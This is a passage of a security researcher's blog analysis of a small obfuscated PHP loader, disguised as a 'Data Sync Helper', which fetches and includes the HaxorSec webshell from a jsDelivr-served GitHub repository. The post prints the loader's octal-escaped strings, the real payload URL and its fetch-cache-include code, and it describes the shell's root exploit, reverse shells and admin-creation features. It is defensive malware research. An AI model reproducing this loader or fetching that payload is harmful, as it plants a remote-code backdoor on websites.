---
title: HaxorSec - A 1 KB Loader That Pulls a Full Webshell From jsDelivr
url: https://lukeleal.com/research/posts/haxorsec-jsdelivr-loader-webshell/
source: Over Security
date: 2026-11-14
fetch_date: 2026-11-15T08:37:37.852845
---

# HaxorSec - A 1 KB Loader That Pulls a Full Webshell From jsDelivr

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [HaxorSec - A 1 KB Loader That Pulls a Full Webshell From jsDelivr](https://lukeleal.com/research/posts/haxorsec-jsdelivr-loader-webshell/)

2026-11-02Luke

#[HaxorSec](https://lukeleal.com/research/tags/haxorsec/)
#[jsDelivr](https://lukeleal.com/research/tags/jsdelivr/)
#[web shell](https://lukeleal.com/research/tags/web-shell/)
#[backdoor](https://lukeleal.com/research/tags/backdoor/)
#[Chankro](https://lukeleal.com/research/tags/chankro/)
#[PwnKit](https://lukeleal.com/research/tags/pwnkit/)
#[cPanel](https://lukeleal.com/research/tags/cpanel/)
#[loader](https://lukeleal.com/research/tags/loader/)
#[PHP](https://lukeleal.com/research/tags/php/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![HaxorSec - A 1 KB Loader That Pulls a Full Webshell From jsDelivr](https://lukeleal.com/research/haxorsec-jsdelivr-cover-q90.jpg "Cover Image")

## Table of Contents

* [The Loader](#the-loader)
  + [The cache logic](#the-cache-logic)
* [Where the Payload Lives](#where-the-payload-lives)
* [The Payload: HaxorSec](#the-payload-haxorsec)
  + [A table of hidden function names](#a-table-of-hidden-function-names)
  + [No lock on the door](#no-lock-on-the-door)
  + [What the menu offers](#what-the-menu-offers)
  + [Auto Root: PwnKit](#auto-root-pwnkit)
  + [Terminal Bypass: Chankro](#terminal-bypass-chankro)
  + [CPanel Reset](#cpanel-reset)
  + [Create WP User](#create-wp-user)
  + [Backconnect](#backconnect)
  + [Lock Shell, Unlock Shell and “Destroy”](#lock-shell-unlock-shell-and-destroy)
  + [Smaller pieces](#smaller-pieces)
  + [A logo that reports where the shell is](#a-logo-that-reports-where-the-shell-is)
* [Lineage](#lineage)
* [Detection & Cleanup](#detection--cleanup)
* [IOCs](#iocs)
* [Samples](#samples)

The sample is only **1,111 bytes**. It was found today, 2026-11-02. It’s dressed as a *“Data Sync Helper”* with a copyright line, an MIT license and an Indonesian-style company name, and its strings are hidden as octal escapes. It does one thing: download a file from a public CDN, save it as a hidden file next to itself, and `include` it.

The downloaded file is a **184 KB web shell** called HaxorSec. It has no login. Its menu offers a PwnKit “Auto Root” button, a `disable_functions` bypass, a cPanel password-reset helper, a WordPress admin creator, nine reverse shells, and a “destroy” feature that stops every other PHP file on the site from being requested.

> The loader saves the shell once and never refreshes it. After the first request, taking down the GitHub repo doesn’t switch off a site that has already cached the payload.

I read both files statically and never ran either. To test the loader I ran a copy with the network replaced by a local file and the `include` replaced by `print`.

## The Loader[#](#the-loader)

The first lines set up the disguise and hide the two strings that matter:

```
/* =========================================================
 *  Data Sync Helper
 *  (c) 2026 PT Nusantara Digital
 *  Licensed under MIT License
 * ========================================================= */
@ini_set("\144\151\163\160\154\141\171\137\145\162\162\157\162\163", 0);   // "display_errors"
@error_reporting(0);

$__t = "\150\164\164\160\163\072\057\057\143\144\156\056\152\163\144\145\154\151\166\162..."; // the payload URL
```

Octal escapes decode to plain text. The first is `display_errors`, and `$__t` is:

```
https://cdn.jsdelivr.net/gh/assasincode05-boop/DATA@refs/heads/main/zz.txt
```

A search for `jsdelivr` in the file finds nothing, because the domain only exists as `\143\144\156\056\152\163...`. The header is also a costume: “PT” is the Indonesian form for a limited company, and I didn’t look into the name.

### The cache logic[#](#the-cache-logic)

```
$__k = __DIR__ . "/.c" . substr(sha1($__t), 0, 6) . ".inc";

if (!is_file($__k) || filesize($__k) < 100) {
    $__s = @fopen($__t, "rb");
    ... read it all, write it to $__k, chmod 0600 ...
}

if (is_file($__k) && filesize($__k) > 100) {
    @include $__k;
}
```

The cache file name is `.c` plus the first six hex characters of the URL’s SHA-1, plus `.inc`. For this URL that’s **`.cfee79e.inc`**. I computed it from the real URL and the sandbox run produced exactly that name. A different payload URL gives a different name, so a search should look for the pattern, not only this name.

I ran four tests on a sandboxed copy:

| Test | Result |
| --- | --- |
| remote file smaller than 100 bytes | nothing is saved and nothing is included |
| first fetch of a normal-sized file | `.cfee79e.inc` is created next to the loader with mode `0600`, then included |
| the remote file changes, then a second request | the cache keeps the **first** version. It’s never refreshed |
| `allow_url_fopen=0`, using the real URL path | silent failure: no error, no file |

Three properties follow from the code:

* **It’s frozen.** The only condition for downloading is “the cache file is missing or tiny.” The operator can’t push a new version to a site that already has the cache, short of deleting the file through the shell. That also means a later takedown of the repo won’t affect those sites.
* **It’s quiet.** The file is a dot-file with a `.inc` extension, so scanners that only open `.php` files skip it, but PHP runs it as code when included.
* **It needs `allow_url_fopen`.** There’s no `curl` fallback. On a host that has turned that setting off, the loader does nothing and says nothing.

## Where the Payload Lives[#](#where-the-payload-lives)

`cdn.jsdelivr.net/gh/<user>/<repo>@<ref>/<path>` is jsDelivr’s way of serving files from a GitHub repository. The response is `text/plain` with `cache-control: public, max-age=604800, s-maxage=43200`, so the CDN holds a copy for up to 12 hours. Using a large public CDN means no attacker-owned domain to register, and a host that most firewalls and blocklists leave alone. It’s the same idea as the GitHub-hosted loaders in the [fake Imunify360 dropper](https://lukeleal.com/research/posts/fake-imunify360-github-seo-spam-dropper/) and the [dead drop loaders](https://lukeleal.com/research/posts/dead-drop-loaders-github-bsc-etherhiding/), with the CDN in the middle.

The GitHub account behind the URL was easy to read from its public metadata:

| When (UTC) | What happened |
| --- | --- |
| 2026-04-13 23:16:55 | account `assasincode05-boop` created. It has one repository and no followers |
| 2026-04-13 23:17:09 | repository `DATA` created, 14 seconds later |
| 2026-04-13 23:17:32 | first upload. `adminer.php` is renamed to `adminer.txt` 27 seconds later |
| quiet for almost six months |  |
| 2026-10-04 to 2026-10-28 | 18 more commits in 25 days, with new files appearing in quick succession: `xxxx.txt` (Oct 4), `xxx.txt` (12), `x.txt` (13), `xx.txt` and `z.txt` (14), **`zz.txt` (2026-10-14 06:33)**, `zzzz.php` renamed to `zzzz.txt` (15), `y.txt` (16), `index.txt` (23), `yy.txt` (24), a last upload on Oct 28 |

`zz.txt` was committed once and never changed, so the payload I analyzed (SHA-256 below) has been stable since 14 October. Two files were uploaded as `.php` and renamed to `.txt` straight away.

The repository is a stash of shells, not just the one this loader uses. I only analyzed `zz.t...